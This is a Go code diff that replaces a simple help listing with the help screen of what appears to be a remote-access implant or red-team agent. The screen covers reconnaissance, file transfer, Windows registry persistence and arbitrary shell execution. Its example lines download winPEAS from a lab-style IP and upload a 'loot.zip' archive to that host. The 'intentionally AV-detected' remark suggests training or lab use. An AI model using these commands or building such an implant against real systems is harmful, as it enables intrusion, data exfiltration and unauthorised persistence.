@@ -9,11 +9,46 @@ import (
 )
 
 func HelpCommand(args []string) string {
-	helpText := "Available commands:\n"
-	for cmd := range commands.Commands {
-		helpText += "- " + cmd + "\n"
-	}
-	return helpText
+	return `
+┌──────────────────────────────────────────────────────────┐
+│  AGENT COMMAND INTERFACE                                 │
+└──────────────────────────────────────────────────────────┘
+
+[RECON]
+  recon [--quick|--full|--json]
+    → System enumeration (intentionally AV-detected)
+
+[FILE OPS]
+  download <url> <destination>
+    → Fetch file from HTTP server
+  
+  upload <source> <url>
+    → Send file to HTTP server
+  
+  transfer <download|upload> [args]
+    → Full file transfer interface
+
+[PERSISTENCE]
+  persistence <enable|disable|status> [strategy]
+    → Manage Windows persistence mechanisms
+
+[INFO]
+  info
+    → Display system information
+
+[SHELL]
+  <any command>
+    → Execute in system shell (cmd.exe / bash)
+
+───────────────────────────────────────────────────────────
+Examples:
+  recon --full
+  download http://10.10.14.5/winPEAS.exe C:\Temp\winpeas.exe
+  upload C:\loot.zip http://10.10.14.5/upload
+  persistence enable registry_run_key
+  ipconfig /all
+───────────────────────────────────────────────────────────
+`
 }
 
 func Run(t transport.TCPTransport) {
